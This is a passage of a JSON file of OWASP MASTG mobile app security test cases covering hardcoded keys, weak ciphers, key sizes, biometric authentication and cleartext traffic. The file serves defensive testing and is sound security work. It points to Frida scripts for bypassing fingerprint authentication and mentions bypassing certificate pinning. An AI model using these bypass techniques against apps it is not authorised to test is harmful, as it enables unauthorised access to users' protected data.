target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> on the app binary, or use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0033\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Tracing</a></em> (dynamic analysis) with a tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em>, and look for uses of the cryptographic functions that perform encryption and decryption operations.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where insecure symmetric encryption algorithms are used.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find <a href=\"https://mas.owasp.org/MASTG/0x04g-Testing-Cryptography/#identifying-insecure-andor-deprecated-cryptographic-algorithms\" rel=\"noopener noreferrer\" target=\"_blank\">insecure or deprecated</a> encryption algorithms being used.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0009\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Secure Encryption Algorithms</a></em></li></ul>",
        "code": "MASTG-TEST-0221",
        "sort_order": 24
    },
    {
        "tags":
        [
            "MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code"
        ],
        "testcase": "Use of Hardcoded Cryptographic Keys in Code",
        "details": "<h2>Overview</h2><p>In this test case, we will examine iOS applications for the presence of hardcoded cryptographic keys. Hardcoded keys can be typically found in calls to cryptographic functions or stored as constants or variables within the code. In iOS, cryptographic keys are often used in the following frameworks:</p><ul><li><strong>Security Framework</strong>: The <a href=\"https://developer.apple.com/documentation/security/seckeycreatewithdata(_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecKeyCreateWithData ↗</a> function allows developers to create a cryptographic key from raw data.</li><li><strong>CommonCrypto</strong>: The <a href=\"https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html\" rel=\"noopener noreferrer\" target=\"_blank\">CCCrypt ↗</a> can be initialized with raw key data in its key parameter.</li><li><strong>CryptoKit</strong>: Although CryptoKit provides higher-level abstractions for cryptographic operations, developers might still hardcode cryptographic keys in different formats and feed it to methods like <a href=\"https://developer.apple.com/documentation/cryptokit/p256/signing/privatekey/init(rawrepresentation:)\" rel=\"noopener noreferrer\" target=\"_blank\">P256.Signing.PrivateKey.init(rawRepresentation:) ↗</a> or similar.</li></ul><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary looking for cryptographic APIs as indicated above.</li></ol><h2></h2><h2>Observation</h2><p>The output should include any instances where the app uses cryptographic functions that accept raw key data. Whenever possible, the output should also try to point to the raw key data from the binary.</p><h2></h2><h2>Evaluation</h2><p>The test fails if calls to cryptographic functions with hardcoded keys are found within binary.</p><p>You may find the keys being directly passed as arguments to cryptographic functions (byte arrays or string literals) or stored in variables or constants within the code. Typical representations of hardcoded keys include:</p><ul><li><strong>Raw Byte Arrays</strong>: Cryptographic keys may be directly embedded in the code as arrays of UInt8 or Data objects. For example, a 256-bit AES key might be represented as a [UInt8] array.</li><li><strong>Base64-Encoded Strings</strong>: Developers might encode cryptographic keys as Base64 strings within the code, which can be easily decoded by attackers if discovered.</li><li><strong>Hex-Encoded Strings</strong>: Keys are sometimes stored as hexadecimal strings, which are then converted to Data objects at runtime for cryptographic operations.</li></ul><p>Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).</p>",
        "code": "MASTG-TEST-0213",
        "sort_order": 30
    },
    {
        "tags":
        [
            "MASTG-TEST-0209: Insufficient Key Sizes"
        ],
        "testcase": "Insufficient Key Sizes",
        "details": "<h2>Overview</h2><p>In this test case, we will look for the use insufficient key sizes in iOS apps. To do this, we need to focus on the cryptographic frameworks and libraries that are available in iOS and the methods that are used to generate cryptographic keys.</p><ul><li><strong>CommonCrypto</strong>: The <a href=\"https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html\" rel=\"noopener noreferrer\" target=\"_blank\">CCCrypt ↗</a> function is used for symmetric encryption and decryption and specifies the key size or key length in its fifth parameter keyLength.</li><li><strong>Security</strong>: The <a href=\"https://developer.apple.com/documentation/security/1823694-seckeycreaterandomkey\" rel=\"noopener noreferrer\" target=\"_blank\">SecKeyCreateRandomKey ↗</a> function is used to generate a random key using certain attributes including <a href=\"https://developer.apple.com/documentation/security/ksecattrkeytype\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAttrKeyType ↗</a> and <a href=\"https://developer.apple.com/documentation/security/ksecattrkeysizeinbits\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAttrKeySizeInBits ↗</a>. The <a href=\"https://developer.apple.com/documentation/security/1395339-seckeygeneratepair\" rel=\"noopener noreferrer\" target=\"_blank\">SecKeyGeneratePair ↗</a> function is deprecated in iOS 16.</li><li><strong>CryptoKit</strong>: The <a href=\"https://developer.apple.com/documentation/cryptokit/aes/gcm\" rel=\"noopener noreferrer\" target=\"_blank\">AES.GCM ↗</a> and <a href=\"https://developer.apple.com/documentation/cryptokit/chachapoly\" rel=\"noopener noreferrer\" target=\"_blank\">ChaChaPoly ↗</a> classes are used for symmetric encryption and decryption.</li></ul><p>Since you don't usually generate keys directly in CryptoKit (the library does that for you automatically), we'll focus on the CommonCrypto and Security libraries in this test.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary, or use a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em>, and look for uses of the cryptographic functions that generate keys.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the disassembled code of the functions using CCCrypt or other cryptographic functions.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the use of insufficient key sizes within the source code. For example, a 1024-bit key size is considered insufficient for RSA encryption and a 128-bit key size is considered insufficient for AES encryption considering quantum computing attacks.</p>",
        "code": "MASTG-TEST-0209",
        "sort_order": 27
    },
    {
        "tags":
        [
            "MASTG-TEST-0210: Broken Symmetric Encryption Algorithms"
        ],
        "testcase": "Broken Symmetric Encryption Algorithms",
        "details": "<h2>Overview</h2><p>To test for the use of broken encryption algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.</p><ul><li><strong>CommonCrypto</strong>: The <a href=\"https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html\" rel=\"noopener noreferrer\" target=\"_blank\">CCCrypt ↗</a> function is used for <strong>symmetric algorithms</strong> and specifies the algorithm in its second parameter alg. This includes:<ul><li>kCCAlgorithmAES128</li><li>kCCAlgorithmDES</li><li>kCCAlgorithm3DES</li><li>kCCAlgorithmCAST</li><li>kCCAlgorithmRC4</li><li>kCCAlgorithmRC2</li></ul></li><li><strong>CryptoKit</strong>: This library does not support broken encryption algorithms. It supports the following <strong>symmetric algorithms</strong>:<ul><li>AES.GCM</li><li>ChaChaPoly</li></ul></li></ul><p>Note: the <strong>Security</strong> framework only supports asymmetric algorithms and is therefore out of scope for this test (see <a href=\"https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/generating_new_cryptographic_keys#2863931\" rel=\"noopener noreferrer\" target=\"_blank\">note about symmetric keys ↗</a>).</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary, or use a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em>, and look for uses of the cryptographic functions that perform encryption and decryption operations.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the disassembled code of the functions using the relevant cryptographic functions.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the use of broken encryption algorithms within the source code. For example:</p><ul><li>DES</li><li>3DES</li><li>RC2</li><li>RC4</li></ul><p><strong>Stay up-to-date</strong>: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region.</p><p>Some algorithms may not be considered broken as a whole, but may have <strong>risky configurations</strong> that should be avoided. For example, using a seed or IV that is not generated by a cryptographically secure pseudorandom number generator (CSPRNG) or that is not considered quantum-safe. For instance, an AES 128-bit key size is insufficient in the face of quantum computing attacks. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from <a href=\"https://csrc.nist.gov/pubs/ir/8547/ipd\" rel=\"noopener noreferrer\" target=\"_blank\">NIST IR 8547 \"Transition to Post-Quantum Cryptography Standards\", 2024 ↗</a>.</p><p><strong>Context Considerations</strong>:</p><p>To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.</p>",
        "code": "MASTG-TEST-0210",
        "sort_order": 28
    },
    {
        "tags":
        [
            "MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication"
        ],
        "testcase": " Runtime Use Of Event-Bound Biometric Authentication",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0266\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs for Event-Bound Biometric Authentication</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Use runtime method hooking (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0095\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Hooking</a></em>) and look for uses of <a href=\"https://developer.apple.com/documentation/localauthentication/lacontext/evaluatepolicy(_:localizedreason:reply:)\" rel=\"noopener noreferrer\" target=\"_blank\">LAContext.evaluatePolicy(...) ↗</a> and <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecAccessControlCreateWithFlags ↗</a>, including all flags.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where the LAContext.evaluatePolicy and SecAccessControlCreateWithFlags functions are called including all used flags.</p><h2></h2><h2>Evaluation</h2><p>The test fails if for each sensitive data resource worth protecting:</p><ul><li>LAContext.evaluatePolicy is used explicitly.</li><li>There are no calls to SecAccessControlCreateWithFlags requiring user presence with <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags\" rel=\"noopener noreferrer\" target=\"_blank\">any of the possible flags ↗</a>.</li></ul>",
        "code": "MASTG-TEST-0267",
        "sort_order": 35
    },
    {
        "tags":
        [
            "MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes"
        ],
        "testcase": "References to APIs Detecting Biometric Enrollment Changes",
        "details": "<h2>Overview</h2><p>This test checks whether the app fails to protect sensitive operations against unauthorized access following biometric enrollment changes. An attacker who obtains the device passcode could add a new fingerprint or facial representation via system settings and use it to authenticate in the app.</p><p>The test identifies the absence of the <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryCurrentSet ↗</a> access control flag when storing sensitive items in the Keychain via <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecAccessControlCreateWithFlags ↗</a>. This flag ensures that the associated Keychain item becomes inaccessible if the biometric database changes (e.g., when a new fingerprint or face is added). As a result, only users whose biometric data was enrolled at the time the item was created can unlock it, preventing unauthorized access through later-enrolled biometrics.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary and look for uses of <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecAccessControlCreateWithFlags ↗</a> API with <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryCurrentSet ↗</a> flag.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses SecAccessControlCreateWithFlags with any flag except the kSecAccessControlBiometryCurrentSet flag for any sensitive data resource worth protecting.</p>",
        "code": "MASTG-TEST-0270",
        "sort_order": 38
    },
    {
        "tags":
        [
            "MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files"
        ],
        "testcase": "Hardcoded Cryptographic Keys in Files",
        "details": "<h2>Overview</h2><p>Cryptographic keys may be embedded files such as configuration files or key files, certificate files, or other resource files bundled with the app, making them accessible to anyone who can extract the app's resources. Real-world cases include storing API keys, SSL/TLS private keys, or encryption keys within these files, which can lead to serious security vulnerabilities if the app is reverse-engineered.</p><ul><li><strong>Identified by File Extension</strong>: Files with extensions such as .key, .pem, .crt, .p12, .cer, or .der often contain cryptographic keys or certificates.</li><li><strong>Identified by PEM Markers</strong>: Strings such as -----BEGIN PRIVATE KEY-----, -----BEGIN CERTIFICATE-----, or the byte sequence 0x2d 0x2d 0x2d 0x2d 0x2d (representing ----- in ASCII) within files indicate the presence of PEM-encoded keys or certificates.</li><li><strong>Identified by Common Byte Patterns</strong>: Binary files containing specific byte sequences that match known DER or PKCS#12 formats, such as 0x30 0x82 (indicating the start of a DER-encoded structure), can indicate the presence of cryptographic material.</li><li><strong>Embedded in Property Lists or JSON Files</strong>: Keys might be stored within .plist or .json configuration files, often encoded as Base64 strings.</li><li><strong>Identified by Specific Strings</strong>: Keywords such as privateKey, key, or secret within files or variable names can indicate embedded keys or sensitive data.</li></ul><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary looking for strings or sequences of bytes as indicated above.</li></ol><h2></h2><h2>Observation</h2><p>The output should include any instances where potential cryptographic keys are found hardcoded within the application's source code or binary.</p><h2></h2><h2>Evaluation</h2><p>The test fails if hardcoded cryptographic keys are found within the source code or binary.</p><p>Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).</p>",
        "code": "MASTG-TEST-0214",
        "sort_order": 31
    },
    {
        "tags":
        [
            "MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication"
        ],
        "testcase": "References to APIs Allowing Fallback to Non-Biometric Authentication",
        "details": "<h2>Overview</h2><p>This test checks if the app uses authentication mechanisms that rely on the user's passcode instead of biometrics or allow fallback to device passcode when biometric authentication fails. Specifically, it checks for use of <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/devicepasscode\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlDevicePasscode ↗</a> or <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/userpresence\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlUserPresence ↗</a>.</p><p>The kSecAccessControlUserPresence flag is described in the Apple docs as the option that's typically used as it \"lets the system choose a mechanism, depending on the current situation\". However, this allows fallback to passcode in some cases (e.g. when biometrics aren't configured yet), which is considered weaker than requiring biometrics alone because passcodes are more susceptible to compromise (e.g., through shoulder surfing).</p><p><strong>Note:</strong> This test does not consider <a href=\"https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication\" rel=\"noopener noreferrer\" target=\"_blank\">LAPolicy.deviceOwnerAuthentication ↗</a> for LocalAuthentication flows because that shouldn't be used on its own. See <em><a href=\"https://mas.owasp.org/MASTG-TEST-0266\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs for Event-Bound Biometric Authentication</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of SecAccessControlCreateWithFlags with the kSecAccessControlUserPresence or kSecAccessControlDevicePasscode flags.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses SecAccessControlCreateWithFlags with the kSecAccessControlUserPresence or kSecAccessControlDevicePasscode flags for any sensitive data resource that needs protection.</p><p>The test passes only if the app uses SecAccessControlCreateWithFlags with stricter flags, such as <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometryany\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryAny ↗</a>, <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryCurrentSet ↗</a> to enforce biometric-only access for any sensitive data resource that needs protection (being kSecAccessControlBiometryCurrentSet the one considered the most secure).</p><p><strong>Note:</strong> Using kSecAccessControlUserPresence or kSecAccessControlDevicePasscode is not inherently a vulnerability, but in high-security applications (e.g., finance, government, health), their use can represent a weakness or misconfiguration that reduces the intended security posture. So this issue better categorized as a security weakness or hardening issue, not a critical vulnerability.</p>",
        "code": "MASTG-TEST-0268",
        "sort_order": 36
    },
    {
        "tags":
        [
            "MASTG-TEST-0018: Testing Biometric Authentication"
        ],
        "testcase": "Testing Biometric Authentication",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Note that there are quite some vendor/third party SDKs, which provide biometric support, but which have their own insecurities. Be very cautious when using third party SDKs to handle sensitive authentication logic.</p><h2></h2><h2>Dynamic Analysis</h2><p>Please take a look at this detailed <a href=\"https://labs.withsecure.com/blog/how-secure-is-your-android-keystore-authentication\" rel=\"noopener noreferrer\" target=\"_blank\">blog article about the Android KeyStore and Biometric authentication ↗</a>. This research includes two Frida scripts which can be used to test insecure implementations of biometric authentication and try to bypass them:</p><ul><li><a href=\"https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js\" rel=\"noopener noreferrer\" target=\"_blank\">Fingerprint bypass ↗</a>: This Frida script will bypass authentication when the CryptoObject is not used in the authenticate method of the BiometricPrompt class. The authentication implementation relies on the callback onAuthenticationSucceded being called.</li><li><a href=\"https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass-via-exception-handling.js\" rel=\"noopener noreferrer\" target=\"_blank\">Fingerprint bypass via exception handling ↗</a>: This Frida script will attempt to bypass authentication when the CryptoObject is used, but used in an incorrect way. The detailed explanation can be found in the section \"Crypto Object Exception Handling\" in the blog post.</li></ul>",
        "code": "MASTG-TEST-0018",
        "sort_order": 33
    },
    {
        "tags":
        [
            "MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication"
        ],
        "testcase": "Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0268\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs Allowing Fallback to Non-Biometric Authentication</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Use runtime method hooking (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0095\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Hooking</a></em>) and look for uses of <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecAccessControlCreateWithFlags ↗</a> and specific flags.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where the SecAccessControlCreateWithFlags function is called including all used flags.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses SecAccessControlCreateWithFlags with the kSecAccessControlUserPresence or kSecAccessControlDevicePasscode flags for any sensitive data resource that needs protection.</p><p>The test passes only if the app uses SecAccessControlCreateWithFlags with stricter flags, such as <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometryany\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryAny ↗</a>, <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset\" rel=\"noopener noreferrer\" target=\"_blank\">kSecAccessControlBiometryCurrentSet ↗</a> to enforce biometric-only access for any sensitive data resource that needs protection (being kSecAccessControlBiometryCurrentSet the one considered the most secure).</p>",
        "code": "MASTG-TEST-0269",
        "sort_order": 37
    },
    {
        "tags":
        [
            "MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes"
        ],
        "testcase": "Runtime Use Of APIs Detecting Biometric Enrollment Changes",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0270\" rel=\"noopener noreferrer\" target=\"_blank\"> References to APIs Detecting Biometric Enrollment Changes</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Use runtime method hooking (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0095\" rel=\"noopener noreferrer\" target=\"_blank\"> Method Hooking</a></em>) and look for uses of <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)\" rel=\"noopener noreferrer\" target=\"_blank\">SecAccessControlCreateWithFlags ↗</a> and specific flags.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where the SecAccessControlCreateWithFlags function is called including all used flags.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app uses SecAccessControlCreateWithFlags with any flag except the kSecAccessControlBiometryCurrentSet flag for any sensitive data resource worth protecting.</p>",
        "code": "MASTG-TEST-0271",
        "sort_order": 39
    },
    {
        "tags":
        [
            "MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication"
        ],
        "testcase": "References to APIs for Event-Bound Biometric Authentication",
        "details": "<h2>Overview</h2><p>This test checks if the app insecurely accesses sensitive resources that should be protected by user authentication (e.g., tokens, keys) relying solely** on the LocalAuthentication API for access control instead of using the Keychain API and requiring user presence.</p><p>The <strong>LocalAuthentication</strong> API (e.g., LAContext) provides user authentication (Touch ID, Face ID, device passcode), returning only a success or failure result. However, it <strong>does not</strong> securely store secrets or enforce any security. This makes it susceptible to logic manipulation (e.g., bypassing an if authenticated { ... } check).</p><p>In contrast, the <strong>Keychain</strong> API securely stores sensitive data, and can be configured with access control policies (e.g., require user presence such as biometrics) via kSecAccessControl flags. This ensures authentication is not just a one-time boolean, but part of a <strong>secure data retrieval path (out-of-process)</strong>, so bypassing authentication becomes significantly harder.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis scan with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of LAContext.evaluatePolicy</li><li>Run a static analysis scan with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of Keychain APIs, especially SecAccessControlCreateWithFlags (which should go accompanied by other APIs such as SecItemAdd and SecItemCopyMatching).</li></ol><h2></h2><h2>Observation</h2><p>The analysis should output the locations where the LAContext.evaluatePolicy and Keychain APIs are used in the codebase (or the lack of their use).</p><h2></h2><h2>Evaluation</h2><p>The test fails if for each sensitive data resource worth protecting:</p><ul><li>LAContext.evaluatePolicy is used explicitly.</li><li>There are no calls to SecAccessControlCreateWithFlags requiring user presence with <a href=\"https://developer.apple.com/documentation/security/secaccesscontrolcreateflags\" rel=\"noopener noreferrer\" target=\"_blank\">any of the possible flags ↗</a>.</li></ul>",
        "code": "MASTG-TEST-0266",
        "sort_order": 34
    },
    {
        "tags":
        [
            "MASTG-TEST-0023: Testing the Security Provider"
        ],
        "testcase": "Testing the Security Provider",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Applications based on the Android SDK should depend on GooglePlayServices. For example, in the gradle build file, you will find compile 'com.google.android.gms:play-services-gcm:x.x.x' in the dependencies block. You need to make sure that the ProviderInstaller class is called with either installIfNeeded or installIfNeededAsync. ProviderInstaller needs to be called by a component of the application as early as possible. Exceptions thrown by these methods should be caught and handled correctly. If the application cannot patch its <em><a href=\"https://mas.owasp.org/MASTG-KNOW-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Security Provider</a></em>, it can either inform the API of its less secure state or restrict user actions (because all HTTPS traffic should be deemed riskier in this situation).</p><p>If you have access to the source code, check if the app handle any exceptions related to the security provider updates properly, and if it reports to the backend when the application is working with an unpatched security provider. The Android Developer documentation provides different examples showing <a href=\"https://developer.android.com/privacy-and-security/security-gms-provider\" rel=\"noopener noreferrer\" target=\"_blank\">how to update the Security Provider to prevent SSL exploits ↗</a>.</p><p>Lastly, make sure that NDK-based applications bind only to a recent and properly patched library that provides SSL/TLS functionality.</p><h2></h2><h2>Dynamic Analysis</h2><p>When you have the source code:</p><ol><li>Run the application in debug mode, then create a breakpoint where the app will first contact the endpoint(s).</li><li>Right click the highlighted code and select Evaluate Expression.</li><li>Type Security.getProviders() and press enter.</li><li>Check the providers and try to find GmsCore_OpenSSL, which should be the new top-listed provider.</li></ol><p>When you do not have the source code:</p><ol><li>Use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em> to hook <a href=\"https://developer.android.com/reference/java/security/Security#getProviders()\" rel=\"noopener noreferrer\" target=\"_blank\">java.security.Security.getProviders() ↗</a> or use a script <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0032\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida CodeShare</a></em> like <a href=\"https://codeshare.frida.re/@platix/get-android-security-provider-mstg-network-6/\" rel=\"noopener noreferrer\" target=\"_blank\">@platix/get-android-security-provider-mstg-network-6 ↗</a>.</li><li>Determine whether the first provider is GmsCore_OpenSSL.</li></ol>",
        "code": "MASTG-TEST-0023",
        "sort_order": 40
    },
    {
        "tags":
        [
            "MASTG-TEST-0017: Testing Confirm Credentials"
        ],
        "testcase": "Testing Confirm Credentials",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Make sure that the unlocked key is used during the application flow. For example, the key may be used to decrypt local storage or a message received from a remote endpoint. If the application simply checks whether the user has unlocked the key or not, the application may be vulnerable to a local authentication bypass.</p><h2></h2><h2>Dynamic Analysis</h2><p>Validate the duration of time (seconds) for which the key is authorized to be used after the user is successfully authenticated. This is only needed if setUserAuthenticationRequired is used.</p>",
        "code": "MASTG-TEST-0017",
        "sort_order": 32
    },
    {
        "tags":
        [
            "MASTG-TEST-0236: Cleartext Traffic Observed on the Network"
        ],
        "testcase": "Cleartext Traffic Observed on the Network",
        "details": "<h2>Overview</h2><p>This test intercepts the app's incoming and outgoing network traffic, and checks for any cleartext communication. Whilst the static checks can only show <em>potential</em> cleartext traffic, this dynamic test shows all communication the application definitely makes.</p><p>Warning</p><ul><li>Intercepting traffic on a network level will show all traffic <em>the device</em> performs, not only the single app. Linking the traffic back to a specific app can be difficult, especially when more apps are installed on the device.</li><li>Linking the intercepted traffic back to specific locations in the app can be difficult and requires manual analysis of the code.</li><li>Dynamic analysis works best when you interact extensively with the app. But even then there could be corner cases which are difficult or impossible to execute on every device. The results from this test therefore are likely not exhaustive.</li></ul><h2></h2><h2>Steps</h2><p>You can use one of the following approaches:</p><ul><li>Set up <em><a href=\"https://mas.owasp.org/MASTG-TECH-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> Basic Network Monitoring/Sniffing</a></em> (for Android) or <em><a href=\"https://mas.owasp.org/MASTG-TECH-0062\" rel=\"noopener noreferrer\" target=\"_blank\"> Basic Network Monitoring/Sniffing</a></em> (for iOS) to capture all traffic.</li><li>Set up <em><a href=\"https://mas.owasp.org/MASTG-TECH-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Setting Up an Interception Proxy</a></em> (for Android) or <em><a href=\"https://mas.owasp.org/MASTG-TECH-0063\" rel=\"noopener noreferrer\" target=\"_blank\"> Setting up an Interception Proxy</a></em> (for iOS) to capture all traffic.</li></ul><p><strong>Notes</strong>:</p><ul><li>Interception proxies will show HTTP(S) traffic only. You can, however, use some tool-specific plugins such as <a href=\"https://github.com/summitt/Burp-Non-HTTP-Extension\" rel=\"noopener noreferrer\" target=\"_blank\">Burp-non-HTTP-Extension ↗</a> or other tools like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0078\" rel=\"noopener noreferrer\" target=\"_blank\"> MITM Relay</a></em> to decode and visualize communication via XMPP and other protocols.</li><li>Some apps may not function correctly with proxies like Burp and <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0079\" rel=\"noopener noreferrer\" target=\"_blank\"> ZAP</a></em> because of certificate pinning. In such a scenario, you can still use basic network sniffing to detect cleartext traffic. Otherwise, you can try to disable pinning (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0012\" rel=\"noopener noreferrer\" target=\"_blank\"> Bypassing Certificate Pinning</a></em> for Android and <em><a href=\"https://mas.owasp.org/MASTG-TECH-0064\" rel=\"noopener noreferrer\" target=\"_blank\"> Bypassing 